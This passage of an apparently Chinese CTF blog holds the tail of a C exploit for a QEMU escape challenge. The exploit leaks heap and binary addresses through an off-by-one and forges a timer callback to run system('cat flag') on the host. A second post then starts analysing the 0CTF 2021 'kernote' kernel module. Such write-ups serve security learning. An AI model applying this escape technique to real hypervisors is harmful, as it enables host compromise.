    <span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// leak heap</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. leaking heap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// getchar();</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos = 0x200"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC1<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reset cache_addr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cache_addr/req_addr</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    heap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    timer_ptr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x12b8</span><span class="token punctuation">;</span>
    timer_list_ptr <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x110e8c8</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap address: %#lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_list_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_list_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// leak pie</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. leaking pie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// getchar();</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>

    <span class="token comment">// getchar();</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set time delay"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger timer, pos+=8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify cache_addr before timer runing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">^</span> <span class="token punctuation">(</span>timer_ptr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"waiting for timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// getchar();</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    hfdev_func <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    cbase <span class="token operator">=</span> hfdev_func <span class="token operator">-</span> <span class="token number">0x381190</span><span class="token punctuation">;</span>
    system <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x2d6614</span><span class="token punctuation">;</span>
    binsh <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x869b82</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hfdev_func = %#lx\n"</span><span class="token punctuation">,</span> hfdev_func<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cbase = %#lx\n"</span><span class="token punctuation">,</span> cbase<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system = %#lx\n"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"binsh = %#lx\n"</span><span class="token punctuation">,</span> binsh<span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. fake timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// getchar();</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify timer ptr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// checker</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span> <span class="token operator">=</span> hfdev_func <span class="token operator">^</span> <span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger fake timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
    fake_timer_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">;</span>  <span class="token comment">// expire_time</span>
    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> timer_list_ptr<span class="token punctuation">;</span> <span class="token comment">// timer_list</span>
    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> system<span class="token punctuation">;</span>  <span class="token comment">// cb</span>
    fake_timer_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token comment">// opaque</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"echo getflag! &amp;&amp; cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><blockquote>
<p>跟踪 timer_mod 源码，发现会调用 timer_list 对象里的某个函数指针，伪造 timer_list 就可以不用等回调直接劫持程序控制流了</p>
</blockquote>
<blockquote>
<p>调试是真的麻烦，可以多借助条件断点来调试</p>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li>感谢 @Mr.R 师傅的 writeup </li>
<li><a href="https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</a></li>
<li><a href="http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8</a></li>
<li><a href="https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356">https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356</a></li>
</ol>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-0CTF-FINAL-kernote</title>
    <url>/5b4f46e3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>借此题来学习下 modify_ldt 在 linux kernel 中的利用思路</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>出题人公开的题目附件以及wp：<a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置信息"><a href="#前置信息" class="headerlink" title="前置信息"></a>前置信息</h3><p>题目提供了个  readme.md</p>
<blockquote>
<p>Here are some kernel config options in case you need it</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">CONFIG_SLAB&#x3D;y
CONFIG_SLAB_FREELIST_RANDOM&#x3D;y
CONFIG_SLAB_FREELIST_HARDENED&#x3D;y
CONFIG_HARDENED_USERCOPY&#x3D;y
CONFIG_STATIC_USERMODEHELPER&#x3D;y
CONFIG_STATIC_USERMODEHELPER_PATH&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据该文件可以知道，kernel 使用了 <strong>slab</strong> 而不是默认的 slub 分配器，并且开启了一些缓解措施：</p>
<ol>
<li><strong>SLAB_FREELIST_RANDOM</strong>，free_list 会存在打乱顺序的情况，取到的 object 不可预测（<strong>这里挖个小坑</strong>）</li>
<li><strong>SLAB_FREELIST_HARDENED</strong>，free_list 的 next 指针将不是真实有效的 object 指针，简单描述就是 <code>object-&gt;next = object_addr ^ random ^ next_object_addr</code></li>
<li><strong>HARDENED_USERCOPY</strong>，在使用 copy_to_user、copy_from_user 等函数时，会对内核空间的指针进行检查，对于内核 .text 地址空间，非堆栈空间，非 slab 分配的 object 空间的指针进行拷贝，会使得内核 panic</li>
<li><strong>STATIC_USERMODEHELPER</strong>，modprobe_path 只读</li>
</ol>
<p>run.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
qemu-system-x86_64 <span class="token punctuation">\</span>
-m 128M <span class="token punctuation">\</span>
-kernel ./bzImage <span class="token punctuation">\</span>
-hda ./rootfs.img <span class="token punctuation">\</span>
-append <span class="token string">"console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on"</span> <span class="token punctuation">\</span>
-monitor /dev/null <span class="token punctuation">\</span>
-smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">\</span>
-nographic <span class="token punctuation">\</span>
-cpu kvm64,+smep,+smap <span class="token punctuation">\</span>
-no-reboot <span class="token punctuation">\</span>
-snapshot <span class="token punctuation">\</span>
-s
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开启了 <strong>kaslr</strong>，<strong>kpti</strong></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>漏洞模块 kernote.ko，只有一个 ioctl，且整个过程上自旋锁，根据 request（ioctl 第二个参数）进行不同的操作</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>request = 0x6667，从 <code>kmalloc_caches[5]</code> 也就是 <code>kmalloc-32</code> 中分配一个 object，存储到全局 buf 数组里<br><img src="/images/5b4f46e3/pasted-0.png" alt="note add"></p>
<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>request = 0x6668，释放指定 index 的 object，相关指针也置为了 NULL<br><img src="/images/5b4f46e3/pasted-1.png" alt="note delete"></p>
